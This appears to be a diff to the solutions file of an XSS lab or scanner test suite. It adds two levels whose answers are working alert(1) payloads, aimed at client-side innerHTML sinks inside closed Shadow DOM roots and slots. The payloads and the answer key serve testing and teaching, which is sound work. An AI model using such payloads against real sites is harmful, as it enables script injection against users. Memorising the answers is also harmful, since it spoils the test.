@@ -1,6 +1,6 @@
 # modern-bypass — solutions
 
-Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js CSTI tag bypass, client prototype pollution, SVG direct load, iframe srcdoc, Unicode NFKC, and flawed regex whitelists.
+Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js CSTI tag bypass, client prototype pollution, SVG direct load, iframe srcdoc, Unicode NFKC, flawed regex whitelists, and Shadow DOM (closed root + slot) sinks.
 
 ### modern-bypass-level1
 
@@ -116,3 +116,16 @@ Modern real-world XSS bypasses: multi-step state, DOM clobbering config, Vue.js 
 - payload: `alert(1)`
 - context: Double reflection. First is HTML-escaped inside a single-quoted JS string, but the second is unquoted raw JS.
 
+### modern-bypass-level17
+
+`/modern-bypass/level17/?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E`
+
+- payload: `<img src=x onerror=alert(1)>`
+- context: No server-side reflection. Client-side JS reads `location.search` and injects the value into a **closed** ShadowRoot via `shadowRoot.innerHTML = '<div>Reflected: ' + input + '</div>';`.
+
+### modern-bypass-level18
+
+`/modern-bypass/level18/?query=%3Csvg%20onload%3Dalert(1)%3E`
+
+- payload: `<svg onload=alert(1)>`
+- context: Client-side JS writes the query value into the host's light DOM using `innerHTML`, while a **closed** ShadowRoot renders it via `<slot>`. Tools must execute JS and account for slotting into closed shadow trees.
